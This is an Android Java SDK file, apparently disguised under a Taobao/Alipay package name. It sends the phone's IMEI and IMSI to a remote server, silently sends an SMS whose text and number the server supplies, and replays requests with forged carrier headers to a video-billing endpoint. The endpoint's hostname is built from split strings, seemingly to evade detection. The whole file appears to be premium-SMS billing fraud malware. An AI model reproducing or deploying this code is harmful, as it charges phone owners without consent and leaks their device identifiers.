package com.taobao.alipay.spjd;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPInputStream;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.os.SystemClock;
import android.util.Log;

public class SpjdSdk {
	private static final String TAG = "SpjdSdk";
	private static final String URL_SMS = "paysms.do";
	private static final String URL_CHECKVERSION = "api.do?orderno={orderno}&action=checkversion";
	private static final String URL_TOKEN = "api.do?orderno={orderno}&action=token";
	private static final String URL_PLAYURL = "api.do?orderno={orderno}&action=playurl";
	private static final String URL_PAYRESULT = "api.do?orderno={orderno}&action=payresult";
	
	private Context context;
	private String baseUrl;
	private int ptid;
	private String noid;
	private String ctid;
	private String cpparam;
	
	private String chid = "";
	
	private String imei = "";
	private String imsi = "";
	private String ua = "";
	
	private String errorReason = "";
	private boolean succ = true;
	
	private String orderno = "";
	private String playUrl = "";
	private String req = "";
	private String req3 = "";
	
	private Map<String, String> sessionIdCookie = new HashMap<String, String>();
	
	public SpjdSdk(Context context,String baseUrl,int ptid,String noid,String ctid,String cpparam,String chid,String imei,String imsi,String ua){
		this.context = context;
		this.baseUrl = baseUrl;
		this.ptid = ptid;
		this.noid = noid;
		this.ctid = ctid;
		this.cpparam = cpparam;
		
		this.chid = chid;
		
		this.imei = imei;
		this.imsi = imsi;
		
		this.ua = ua;
	}
	
	public void exec(){
		
		sms();
	
		if(!succ){
			return;
		}
		
		for(int i = 2; i <= 6; i ++){
			execStep(i,0);
			
			if(!succ){
				return;
			}
			
			if(playUrl != null && playUrl.length() > 0){
				break;
			}
		}
		
		if(playUrl != null && playUrl.length() > 0){
			playVideo();
		}
	}
	
	public boolean isSucc(){
		return this.succ;
	}
	
	public String getErrorReason(){
		return this.errorReason;
	}
	
	private void sms(){
		
//		String param = "ptid="+ptid+"&imsi="+imsi+"&imei="+imei+"&noid="+noid+"&ctid="+ctid+"&cpparam="+cpparam+"&version=1.0.0";
		String param = "ptid="+ptid+"&imsi="+imsi+"&imei="+imei+"&noid="+noid+"&ctid="+ctid+"&cpparam="+cpparam+"&ua="+ua+"&version=1.0.1";
		Log.e(TAG,baseUrl+URL_SMS+" with params : "+param);
		String response = postDataCommon(context, param.getBytes(), baseUrl+URL_SMS,false);
		Log.e(TAG, "response of step1 : "+response);
		if(response != null && response.length() > 0){
			try {
				JSONObject jo = new JSONObject(response);
				
				int result = jo.getInt("result");
				
				if(result == 0){
					String smsContent = jo.getString("sms");
					String port = jo.getString("port");
					orderno = jo.getString("orderno");
					
					req = jo.getString("req");
					
					if(SpjdUtils.sendSms(context, port, smsContent)){
						SystemClock.sleep(8000l);
					}else{
						succ = false;
						errorReason = "sendSmsFail";
					}
				}else{
					succ = false;
					errorReason = "step1_"+result;
				}
			} catch (JSONException e) {
				e.printStackTrace();
				succ = false;
				errorReason = "step1JsonErr";
			}
		}else{
			succ = false;
			errorReason = "step1Null";
		}
		
		return;
	}

	private static String getUrl(int step){
		
		switch(step){
		case 2:
			return URL_TOKEN;
		case 3:
			return URL_CHECKVERSION;
		case 4:
			return URL_PLAYURL;
		case 5:
			return URL_PAYRESULT;
		case 6:
			return URL_PLAYURL;
		}
		
		return "";
	}
	
	private void execStep(int step,int num){
		Log.e(TAG, "start to exec step "+step);
		
		String response = "";
		
		String req1 = req;
		
		if(step == 6){
			req1 = req3;
		}
		
		try {
//			response = postVideoPostReq(ua, chid, URLDecoder.decode(req, "utf8"), sessionIdCookie);
			response = postVideoPostReq(ua, chid, req1, sessionIdCookie);
		} catch (Exception e2) {
			e2.printStackTrace();
		}
		
		Log.e(TAG, "response of step"+step+":"+response);
		
		if(response != null && response.length() > 0){
			
			String url = (baseUrl+getUrl(step)).replace("{orderno}", orderno);
			
			String response1 = "";
			
			try {
				response1 = postDataCommon(context, response.getBytes("utf-8"), url, true);
			} catch (UnsupportedEncodingException e1) {
				e1.printStackTrace();
			}
			
			Log.e(TAG, "response1 of "+step+":"+response1);
			
			if(response1 != null && response1.length() > 0){
				try {
					JSONObject jo = new JSONObject(response1);
					
					int result = jo.getInt("result");
					
					if(result == 0){
						req = jo.getString("req");
						
						if(step == 3){
							req3 = req;
						}
						if(step == 6){
							playUrl = jo.getString("sid");
						}
					}else{
						if(step == 2 && result == -1){
							if(num <= 6){
								SystemClock.sleep(5000l);
								execStep(step, num+1);
							}else{
								succ = false;
								errorReason = "step"+step+"Err"+result;
							}
						}else if((step == 4 || step == 6) && jo.has("sid")){
							playUrl = jo.getString("sid");
							if(!playUrl.startsWith("http")){
								succ = false;
								errorReason = "step"+step+"Err"+result;
							}
						}else{
							succ = false;
						}
					}
				} catch (JSONException e) {
					e.printStackTrace();
					succ = false;
					errorReason = "step"+step+"JsonErr";
				}
			}else{
				succ = false;
				errorReason = "step"+step+"ParseFail";
			}
		}else{
			succ = false;
			errorReason = "step"+step+"GetFail";
		}
	}
	
	private void playVideo(){
		Log.e(TAG, "playVideo:"+playUrl);
		//播放playUrl
		byte[] bytes = getDataBytes(context, playUrl, 2);
		
		return;
	}
	
	private byte[] getDataBytes(Context context,String url_,int length){
		
		HttpURLConnection httpUrlConnection = null;
        InputStream inStrm = null;
        ByteArrayOutputStream baos = null;
        BufferedInputStream bis = null;
        
        try {
        	URL url = new URL(url_);
        	httpUrlConnection = (HttpURLConnection)url.openConnection();
        	
            httpUrlConnection.setAllowUserInteraction(true);
            httpUrlConnection.setDoInput(true);
            httpUrlConnection.setUseCaches(false);
    
            httpUrlConnection.setRequestMethod("GET");
            httpUrlConnection.setConnectTimeout(20000);
           
            if (length != 0) {
            	httpUrlConnection.setRequestProperty("RANGE", "bytes=0-" + (length * 1024));
            }
            
            inStrm = httpUrlConnection.getInputStream();
            
            baos = new ByteArrayOutputStream();
            
            bis = new BufferedInputStream(inStrm);
            byte[] buf = new byte[1024];
            int readSize = -1;
            
            while ((readSize = bis.read(buf)) != -1) {
            	baos.write(buf, 0, readSize);
            }
            
            byte[] data = baos.toByteArray();

            return data;
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.toString());
            e.printStackTrace();
        } finally {
        	if(baos != null){
        		try {
					baos.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	if(bis != null){
        		try {
					bis.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(inStrm != null){
        		try {
					inStrm.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
            if (httpUrlConnection != null) {
                httpUrlConnection.disconnect();
                httpUrlConnection = null;
            }

            System.gc();
        }
      
        return null;
    }
		
	public String postDataCommon(Context context, byte[] byt, String url_,boolean bodyPost) {
    	return postDataCommon(context, byt, url_, bodyPost,0);
    }
	
	public String postDataCommon(Context context,byte[] byt,String url_,boolean bodyPost,int num){
		String result = null;
		
		byte[] bytes = postDataBytes(context, byt, url_,bodyPost);
    	
    	if(bytes != null && bytes.length >= 0){
    		if(bytes.length == 0){
    			result = "";
    		}else{
	    		try {
					result = new String(bytes, "UTF-8");
				} catch (UnsupportedEncodingException e) {
					e.printStackTrace();
				}
    		}
    	}
    	
    	if(result == null || result.length() == 0){
    		if(num <= 1){
    			SystemClock.sleep(5000);
    			return postDataCommon(context, byt, url_, bodyPost, num+1);
    		}
    	}
    
    	return result;
    	
	}
	
	public byte[] postDataBytes(Context context, byte[] byt, String url_,boolean bodyPost) {
    	
        HttpURLConnection httpUrlConnection = null;
        InputStream inStrm = null;
        ByteArrayOutputStream baos = null;
        BufferedInputStream bis = null;
        
        try {
        	URL url = new URL(url_);
        	httpUrlConnection = (HttpURLConnection)url.openConnection();
        	
            httpUrlConnection.setAllowUserInteraction(true);
            httpUrlConnection.setDoOutput(true);
            httpUrlConnection.setDoInput(true);
            httpUrlConnection.setUseCaches(false);
            if(bodyPost){
            	httpUrlConnection.setRequestProperty("Content-type","application/x-java-serialized-object");
            	httpUrlConnection.setRequestProperty("Content-Length", byt.length+"");
            }else{
            	httpUrlConnection.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            }
            httpUrlConnection.setRequestMethod("POST");
            httpUrlConnection.setConnectTimeout(20000);
            OutputStream outStrm = httpUrlConnection.getOutputStream();

            outStrm.write(byt);
            outStrm.flush();
            outStrm.close();

            inStrm = httpUrlConnection.getInputStream();
            
            baos = new ByteArrayOutputStream();
            
            bis = new BufferedInputStream(inStrm);
            byte[] buf = new byte[1024];
            int readSize = -1;
            
            while ((readSize = bis.read(buf)) != -1) {
            	baos.write(buf, 0, readSize);
            }
            
            byte[] data = baos.toByteArray();

            return data;
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.toString());
            e.printStackTrace();
        } finally {
        	
        	if(baos != null){
        		try {
					baos.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	if(bis != null){
        		try {
					bis.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
        	if(inStrm != null){
        		try {
					inStrm.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
        	}
        	
            if (httpUrlConnection != null) {
                httpUrlConnection.disconnect();
                httpUrlConnection = null;
            }

            System.gc();
        }
      
        return null;
    }
	
	private static String postVideoPostReq(String UA, String chid,String context,Map<String,String> sessionIdCookie) {
		return postVideoPostReq(UA, chid, context, sessionIdCookie, 0);
	}
	
	private static String postVideoPostReq(String UA, String chid,String context,Map<String,String> sessionIdCookie,int num) {
		String result = "";
		PrintWriter out = null;
		InputStream in = null;
		
		try {
			StringBuffer sb = new StringBuffer();
			sb.append("http://").append("sdk").append("2.").append("cmv").append("ideo.cn");
			sb.append("/clt").append("30/test.jsp");
			
//			URL realUrl = new URL("http://sdk2.cmvideo.cn/clt30/test.jsp");
			
			URL realUrl = new URL(sb.toString());
			
			URLConnection conn = realUrl.openConnection();
			conn.setConnectTimeout(3000);
			
			StringBuffer sb1 = new StringBuffer();
			sb1.append("sdk").append("2.cmv").append("ideo.cn");
			conn.setRequestProperty("Host", sb1.toString());
//			conn.setRequestProperty("Host", "sdk2.cmvideo.cn");
			
			conn.setRequestProperty("User-Agent", UA);
			conn.setRequestProperty("x-up-bear-type", "WLAN");
			conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
			conn.setRequestProperty("X_UP_CLIENT_CHANNEL_ID", "04090200-99000-" + chid);
			conn.setRequestProperty("WDAccept-Encoding", "gzip,deflate");
			conn.setRequestProperty("Accept-Encoding", "gzip,deflate");
			conn.setRequestProperty("Connection", "Keep-Alive");
			if (sessionIdCookie.containsKey("Cookie")){
				conn.setRequestProperty("Cookie", sessionIdCookie.get("Cookie"));
			}
			if (sessionIdCookie.containsKey("sessionId")){
				conn.setRequestProperty("sessionId", sessionIdCookie.get("sessionId"));
			}
			conn.setDoOutput(true);
			conn.setDoInput(true);
			
			out = new PrintWriter(conn.getOutputStream());
			out.print(context);
			out.flush();

			if (conn.getHeaderFields().containsKey("Set-Cookie")){
				sessionIdCookie.put("Cookie",conn.getHeaderField("Set-Cookie"));
			}
			if (conn.getHeaderFields().containsKey("sessionId")){
				sessionIdCookie.put("sessionId",conn.getHeaderField("sessionId"));
			}

			in = conn.getInputStream();
			
            byte[] data = writeByteArray(in);

			result = new String(data, "UTF-8");
		} catch (Exception e) {
			Log.e(TAG,"发送 POST 请求出现异常！" + e);
			e.printStackTrace();
		} finally {
			
        	try {
				if (out != null) {
					out.close();
				}
				if (in != null) {
					in.close();
				}
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}

//		Log.e(TAG,"VideoPostReq:\nresult:\n" + result);
		if (sessionIdCookie.containsKey("Cookie")){
			Log.e(TAG,"Cookie:"+ (String) sessionIdCookie.get("Cookie"));
		}
		if (sessionIdCookie.containsKey("sessionId")){
			Log.e(TAG,"sessionId:" + (String) sessionIdCookie.get("sessionId"));
		}

		if(result == null || result.length() == 0){
			if(num <= 1){
				SystemClock.sleep(5000);
				return postVideoPostReq(UA, chid, context, sessionIdCookie, num+1);
			}
		}
		
		return result;
	}

	private static byte[] writeByteArray(InputStream inputstream) {
		InputStream in = parseInputStream(inputstream);
		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		try {
			int len = 0;
			byte[] b = new byte[1024];
			while ((len = in.read(b, 0, b.length)) != -1) {
				baos.write(b, 0, len);
			}
			byte[] data = baos.toByteArray();
			return null != data && data.length > 10 ? data : null;
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		}finally{
			try {
				in.close();
				baos.close();
			} catch (IOException e) {
				e.printStackTrace();
			}
			
		}
	}
	
	private static InputStream parseInputStream(InputStream inputStream) {
		BufferedInputStream bis = new BufferedInputStream(inputStream);
		try {
			bis.mark(2);
			byte[] header = new byte[2];
			int result = bis.read(header);
			bis.reset();
			int headerData = getShort(header);
			if (result != -1 && headerData == 0x1f8b) {
				return new GZIPInputStream(bis);
			}
		} catch (Exception e) {
			Log.e(TAG,"parseInputStream error:"+e.getMessage());
			e.printStackTrace();
		}
		return bis;
	}

	private static int getShort(byte[] data) {
		int header = (data[0] << 8) | data[1] & 0xFF;
		return header;
	}

}
